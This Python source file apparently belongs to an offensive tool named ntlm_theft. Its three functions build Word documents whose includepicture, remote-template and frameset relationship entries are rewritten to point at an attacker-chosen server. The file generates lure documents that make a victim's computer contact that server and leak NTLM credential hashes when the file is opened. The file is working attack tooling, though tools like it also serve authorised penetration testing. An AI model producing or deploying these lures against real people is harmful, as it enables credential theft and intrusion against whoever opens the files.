#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import shutil
from ntlm_theft.files import script_directory


def create_docx_includepicture(generate, server, filename):
    src = os.path.join(script_directory, "templates", "docx-includepicture-template")
    dest = os.path.join("docx-includepicture-template")
    shutil.copytree(src, dest)
    documentfilename = os.path.join(
        "docx-includepicture-template", "word", "_rels", "document.xml.rels"
    )
    file = open(documentfilename, "r")
    filedata = file.read()
    file.close()
    filedata = filedata.replace("127.0.0.1", server)
    file = open(documentfilename, "w")
    file.write(filedata)
    file.close()
    shutil.make_archive(filename, "zip", "docx-includepicture-template")
    os.rename(filename + ".zip", filename)
    shutil.rmtree("docx-includepicture-template")
    print("Created: " + filename + " (OPEN)")


def create_docx_remote_template(generate, server, filename):
    src = os.path.join(script_directory, "templates", "docx-remotetemplate-template")
    dest = os.path.join("docx-remotetemplate-template")
    shutil.copytree(src, dest)
    documentfilename = os.path.join(
        "docx-remotetemplate-template", "word", "_rels", "settings.xml.rels"
    )
    file = open(documentfilename, "r")
    filedata = file.read()
    file.close()
    filedata = filedata.replace("127.0.0.1", server)
    file = open(documentfilename, "w")
    file.write(filedata)
    file.close()
    shutil.make_archive(filename, "zip", "docx-remotetemplate-template")
    os.rename(filename + ".zip", filename)
    shutil.rmtree("docx-remotetemplate-template")
    print("Created: " + filename + " (OPEN)")


def create_docx_frameset(generate, server, filename):
    src = os.path.join(script_directory, "templates", "docx-frameset-template")
    dest = os.path.join("docx-frameset-template")
    shutil.copytree(src, dest)
    documentfilename = os.path.join(
        "docx-frameset-template", "word", "_rels", "webSettings.xml.rels"
    )
    file = open(documentfilename, "r")
    filedata = file.read()
    file.close()
    filedata = filedata.replace("127.0.0.1", server)
    file = open(documentfilename, "w")
    file.write(filedata)
    file.close()
    shutil.make_archive(filename, "zip", "docx-frameset-template")
    os.rename(filename + ".zip", filename)
    shutil.rmtree("docx-frameset-template")
    print("Created: " + filename + " (OPEN)")
